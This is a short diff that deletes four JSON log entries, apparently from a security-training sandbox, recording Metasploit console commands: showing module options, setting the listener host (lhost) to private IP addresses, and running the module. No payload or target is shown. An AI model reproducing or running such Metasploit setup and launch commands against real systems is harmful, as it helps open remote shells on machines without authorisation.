@@ -1,4 +1,0 @@
-{"sandbox_id": "396", "timestamp_str": "2019-08-14T16:41:39.192948Z", "cmd_type": "msf-command", "cmd": "show options "}
-{"sandbox_id": "396", "timestamp_str": "2019-08-14T16:42:04.572965Z", "cmd_type": "msf-command", "cmd": "set lhost 172.16.1.88"}
-{"sandbox_id": "396", "timestamp_str": "2019-08-14T16:42:08.516211Z", "cmd_type": "msf-command", "cmd": "run"}
-{"sandbox_id": "396", "timestamp_str": "2019-08-14T16:42:30.950962Z", "cmd_type": "msf-command", "cmd": "set lhost 10.0.135.83"}
